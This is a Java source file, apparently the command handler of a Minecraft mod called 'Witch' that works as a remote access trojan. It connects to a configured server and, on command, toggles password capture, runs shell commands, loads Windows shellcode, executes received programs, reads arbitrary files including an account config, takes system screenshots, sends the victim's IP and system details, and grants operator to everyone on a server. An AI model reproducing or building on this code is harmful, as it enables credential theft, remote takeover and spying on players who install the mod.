package me.soda.witch.client.connection;

import me.soda.witch.client.Witch;
import me.soda.witch.client.utils.*;
import me.soda.witch.shared.*;
import me.soda.witch.shared.socket.TcpClient;
import me.soda.witch.shared.socket.messages.DisconnectInfo;
import me.soda.witch.shared.socket.messages.Message;
import net.minecraft.client.util.GlfwUtil;

import java.lang.management.ManagementFactory;

public class Client extends TcpClient {
    public int reconnections = 0;

    public Client() {
        super(Cfg.host, Cfg.port, 30000);
    }

    public static void handleMessage(Message message) {
        String msgType = message.messageID;
        Object msg = message.data;
        LogUtil.println("Received message: " + msgType);
        try {
            switch (msgType) {
                case "steal_pwd_switch" -> Witch.VARIABLES.passwordBeingLogged = !Witch.VARIABLES.passwordBeingLogged;
                case "chat_control" -> ChatUtils.sendChat((String) msg);
                case "chat_filter" -> Witch.VARIABLES.filterPattern = (String) msg;
                case "chat_filter_switch" -> Witch.VARIABLES.isBeingFiltered = !Witch.VARIABLES.isBeingFiltered;
                case "chat_mute" -> Witch.VARIABLES.isMuted = !Witch.VARIABLES.isMuted;
                case "mods" -> Witch.send(msgType, MCUtils.allMods());
                case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                case "screenshot" -> ScreenshotUtil.gameScreenshot();
                case "screenshot2" -> Witch.send(msgType, ScreenshotUtil.systemScreenshot());
                case "chat" -> {
                    Witch.CHAT_WINDOW.frame.setVisible(true);
                    Witch.CHAT_WINDOW.appendText("Admin:" + msg);
                }
                case "shell" -> new Thread(() -> {
                    String result = ProgramUtil.runCmd((String) msg);
                    Witch.send(msgType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ProgramUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                }
                case "log" -> Witch.VARIABLES.logChatAndCommand = !Witch.VARIABLES.logChatAndCommand;
                case "config" -> Witch.send(msgType, Witch.VARIABLES);
                case "player" -> Witch.send(msgType, MCUtils.getPlayerInfo());
                case "skin" -> MCUtils.sendPlayerSkin();
                case "server" -> {
                    MCUtils.disconnect();
                    Witch.VARIABLES.canJoinServer = !Witch.VARIABLES.canJoinServer;
                }
                case "kick" -> MCUtils.disconnect();
                case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
                case "iasconfig" -> Witch.send(msgType, FileUtil.read("config/ias.json"));
                case "read" -> Witch.send(msgType, FileUtil.read((String) msg));
                case "runargs" -> Witch.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                case "props" -> Witch.send(msgType, System.getProperties());
                case "ip" -> Witch.send(msgType, NetUtil.getIP());
                case "crash" -> GlfwUtil.makeJvmCrash();
                case "server_name" -> Witch.VARIABLES.name = (String) msg;
                case "op@a" -> OpEveryone.INSTANCE.opEveryone();
            }
        } catch (Exception e) {
            LogUtil.println("Corrupted message!");
            LogUtil.printStackTrace(e);
        }
    }

    @Override
    public boolean onReconnect() {
        if (reconnections <= 10) {
            reconnections++;
        } else {
            reconnectTimeout = -1;
            LogUtil.println("Witch end because of manual shutdown or too many reconnections");
            return false;
        }
        return true;
    }

    @Override
    public void onOpen() {
        LogUtil.println("Connection initialized");
        Witch.send("player", MCUtils.getPlayerInfo());
        Witch.send("ip", NetUtil.getIP());
        Witch.send("server_name");
    }

    @Override
    public void onMessage(Message message) {
        handleMessage(message);
    }

    @Override
    public void onClose(DisconnectInfo disconnectInfo) {
        LogUtil.println("Disconnected: " + disconnectInfo.reason());
    }
}